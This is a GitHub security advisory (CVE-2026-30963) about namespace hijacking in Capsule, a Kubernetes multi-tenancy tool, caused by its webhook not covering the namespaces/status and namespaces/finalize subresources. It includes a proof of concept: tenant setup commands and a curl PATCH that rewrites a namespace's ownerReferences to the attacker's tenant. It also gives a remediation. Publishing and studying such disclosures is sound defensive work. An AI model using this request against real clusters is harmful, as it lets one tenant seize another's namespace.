{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/177493686?v=4", "events_url": "https://api.github.com/users/xy585/events{/privacy}", "followers_url": "https://api.github.com/users/xy585/followers", "following_url": "https://api.github.com/users/xy585/following{/other_user}", "gists_url": "https://api.github.com/users/xy585/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/xy585", "id": 177493686, "login": "xy585", "node_id": "U_kgDOCpRWtg", "organizations_url": "https://api.github.com/users/xy585/orgs", "received_events_url": "https://api.github.com/users/xy585/received_events", "repos_url": "https://api.github.com/users/xy585/repos", "site_admin": false, "starred_url": "https://api.github.com/users/xy585/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/xy585/subscriptions", "type": "User", "url": "https://api.github.com/users/xy585", "user_view_type": "public"}}], "cve_id": "CVE-2026-30963", "cvss": {"score": 3.9, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L"}, "cvss_severities": {"cvss_v3": {"score": 3.9, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-20", "name": "Improper Input Validation"}], "description": "### Summary
To defend against namespace hijacking achieved through update/patch operations on namespaces, Capsule uses a webhook to validate update requests targeting namespaces. However, in Kubernetes, the namespace/finalize and namespace/status subresource APIs can also modify various fields of a namespace, including the metadata field. The webhook does not define interception rules for these subresources. As a result, if a tenant administrator has permission to modify namespace/status or namespace/finalize, they can successfully perform namespace hijacking.

### Details
When Capsule uses a ValidatingWebhookConfiguration to intercept changes to namespace resources, it does not intercept modification requests initiated through namespace subresource APIs (see: https://github.com/projectcapsule/capsule/blob/main/charts/capsule/templates/validatingwebhookconfiguration.yaml#L193). Through subresource APIs, it is still possible to modify the metadata field of a namespace resource, enabling hijacking.

### PoC
Open two terminals and create two tenants:
```
kubectl create -f - << EOF
apiVersion: capsule.clastix.io/v1beta2
kind: Tenant
metadata:
  name: oil
spec:
  owners:
  - name: alice
    kind: User
EOF

./hack/create-user.sh alice solar
export KUBECONFIG=alice-solar.kubeconfig
kubectl create namespace solar-production # alice creates the namespace
```

```
kubectl create -f - << EOF
apiVersion: capsule.clastix.io/v1beta2
kind: Tenant
metadata:
  name: attacker
spec:
  owners:
  - name: attacker
    kind: User
EOF

./hack/create-user.sh attacker attacker
export KUBECONFIG=attacker-attacker.kubeconfig
```

When the attacker has permission to modify namespace/status or namespace/finalize, they can hijack other namespaces. Here we grant the attacker the relevant permissions:
```
kubectl create clusterrole status --verb=patch --resource=namespaces/status
kubectl create clusterrolebinding status --clusterrole=status --user=attacker
```
The attacker then sends a PATCH request to namespace/status to hijack the namespace created by alice:
```
curl -k --cert ./attacker-attacker.crt --key attacker-attacker.key --request PATCH 'https://192.168.201.12:6443/api/v1/namespaces/solar-production/status' \
--header 'Content-Type: application/json-patch+json' \
--data '[
    {
      "op": "replace",
      "path": "/metadata/ownerReferences",
      "value": [
        {
          "apiVersion": "capsule.clastix.io/v1beta2",
            "kind": "Tenant",
            "name": "attacker",
            "uid": "1fcb9c9b-b552-4974-a248-32be66a2188c"
        }
      ]
    }
  ]'
```

### Impact
hijack namespace

### Remediation
To mitigate this issue, add the following two subresources to the resources list in the ValidatingWebhookConfiguration rules:
```
    resources:
    - namespaces
    - namespaces/status
	- namespace/finalize
```", "epss": {"percentage": 0.00202, "percentile": 0.10141}, "ghsa_id": "GHSA-2ww6-hf35-mfjm", "github_reviewed_at": "2026-05-28T17:01:41Z", "html_url": "https://github.com/advisories/GHSA-2ww6-hf35-mfjm", "identifiers": [{"type": "GHSA", "value": "GHSA-2ww6-hf35-mfjm"}, {"type": "CVE", "value": "CVE-2026-30963"}], "nvd_published_at": "2026-06-01T19:16:22Z", "published_at": "2026-05-28T17:01:41Z", "references": ["https://github.com/projectcapsule/capsule/security/advisories/GHSA-2ww6-hf35-mfjm", "https://github.com/projectcapsule/capsule/releases/tag/v0.13.0", "https://nvd.nist.gov/vuln/detail/CVE-2026-30963", "https://github.com/advisories/GHSA-2ww6-hf35-mfjm"], "repository_advisory_url": "https://api.github.com/repos/projectcapsule/capsule/security-advisories/GHSA-2ww6-hf35-mfjm", "severity": "low", "source_code_location": "https://github.com/projectcapsule/capsule", "summary": "Capsule Namespace Hijacking via subresource", "type": "reviewed", "updated_at": "2026-06-09T10:50:52Z", "url": "https://api.github.com/advisories/GHSA-2ww6-hf35-mfjm", "vulnerabilities": [{"first_patched_version": "0.13.0", "package": {"ecosystem": "go", "name": "github.com/projectcapsule/capsule"}, "vulnerable_functions": [], "vulnerable_version_range": "< 0.13.0"}], "withdrawn_at": null}

title: Capsule Namespace Hijacking via subresource
